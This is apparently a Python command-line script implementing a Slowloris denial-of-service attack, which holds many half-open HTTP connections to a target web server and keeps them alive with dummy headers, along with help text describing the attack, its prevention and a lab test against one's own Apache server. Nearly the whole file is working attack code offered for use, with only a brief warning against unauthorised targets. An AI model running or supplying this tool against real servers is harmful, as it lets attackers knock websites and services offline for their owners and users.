import argparse, random, socket, sys   

def slowLoris(ip,port=80,socketCount=200):
    def newSocket(ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip,port))
        sock.send(f"Get /? {random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        sock.send(bytes(bytes("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\n".encode("utf-8"))))
        sock.send(bytes(bytes("Accept-Language: en-us,en;q=0.9\r\n".encode("utf-8"))))
        return sock 

    socketList = []
    print(f"Slowloris DoSing {ip}:{port} with {socketCount} sockets.")
    for _ in range(socketCount):
        try:
            s = newSocket(ip)
            print("Creating socket",_)
        except socket.error as sockError:
            print("Error: "+str(sockError))
            break
        socketList.append(s)

    while True:
        try:
            print(f"Sending Keep Alive headers for {len(socketList)} sockets")
            for s in list(socketList):
                try:
                    s.send(f"X-a: {random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
                except socket.error:
                    socketList.remove(s)

            for _ in range(socketCount - len(socketList)):
                try:
                    s = newSocket(ip)
                    if s:
                        socketList.append(s)
                except socket.error as sockError:
                    print("Error: "+str(sockError))
                    break

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris Attack")
            break

if __name__ == "__main__":

    about ="Slowloris DOS attack:\n"+\
           "A Slowloris Denial Of Service attack is a cyber attack which targets a network or machine"+\
           "inorder to take down another machine's web server with minimal bandwidth\n\n"+\
           "Working:\nIn this attack, mutiple web sockets are created and trie to keep as many of"+\
           "these connections to the target web server open as long as possible\n\n"+\
           "Prevention:\nSet an absolute connection timeout,Limit the header and message body to a minimal reasonable length\n\n"+\
           "How to try it out:\n"+\
           "-Create an apache2 server listening on a particular ip and host\n"+\
           "-On openning a browser you will see it load pretty immediately and serve the required webpage\n"+\
           "-Now Slowloris DOS this host and port\n"+\
           "-You will observe that this network is heavily crowded and can observe the browser buffering\n\n"+\
           "USE WISELY! DO NOT DOS NETWORKS AND MACHINES YOU DO NOT HAVE CONTROL OVER!"
  
    parser = argparse.ArgumentParser( description=about, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("host", nargs="?", help="Host IP to slowloris DoS")
    parser.add_argument("-p", "--port"   , default=80 , type=int)
    parser.add_argument("-s", "--sockets", default=200, type=int)

    args = parser.parse_args()

    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    if not args.host:
        print("Missing host address!")
        parser.print_help()
        sys.exit(1)

    slowLoris(args.host,args.port,args.sockets)
